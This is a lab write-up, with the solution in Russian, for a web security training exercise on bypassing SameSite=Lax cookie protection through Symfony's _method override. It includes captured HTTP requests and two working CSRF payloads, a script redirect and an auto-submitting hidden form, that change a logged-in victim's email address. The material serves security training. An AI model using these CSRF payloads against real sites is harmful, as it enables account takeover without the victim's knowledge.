# SameSite Lax bypass via method override
PRACTITIONER

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials: wiener:peter

## Решение
При логине кукис "session" устанавливается без явного указания атрибута SameSite. Как известно, "жертва" использует Chrome, а в Chrome SameSite установится в Lax. Это значит, что можно отправить с другого сайта GET-запрос, которому будет доступен кукис "session".
```
POST /login HTTP/2
Host: 0aae00a703de72528386788e001d00e2.web-security-academy.net
Cookie: session=63aZqwTW9d5ekwbpg3tkv2n46TlxaNQI
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://0aae00a703de72528386788e001d00e2.web-security-academy.net
Referer: https://0aae00a703de72528386788e001d00e2.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

username=wiener&password=peter
```
Функционал смены email не принимает GET-запросов:
```
GET /my-account/change-email?email=wiener456@normal-user.net&_method=POST HTTP/2
Host: 0aae00a703de72528386788e001d00e2.web-security-academy.net
Cookie: session=kRxax3oqErWswnOw13zH6LPe4Jjp49NL
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://exploit-0a15009c031772c98389773a016a00e0.exploit-server.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Te: trailers
```
```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 29

"That email is not available"
```
Но это ограничение можно обойти в случае фреймворка Symfony, если добавить запросу query-параметр `_method=POST`:
```
<script>
document.location = "https://0aae00a703de72528386788e001d00e2.web-security-academy.net/my-account/change-email?email=wiener456@normal-user.net&_method=POST";
</script>
```
Или через форму:
```
<html>
<body>
    <form action="https://0ac6000e031c7ecd84950e05002400f9.web-security-academy.net/my-account/change-email" method="GET">
        <input type="hidden" name="email" value="wiener123@normal-user.net">
        <input type="hidden" name="_method" value="POST">
    </form>
    <script>document.forms[0].submit();</script>
</body>
</html>
```
Задание выполнено.
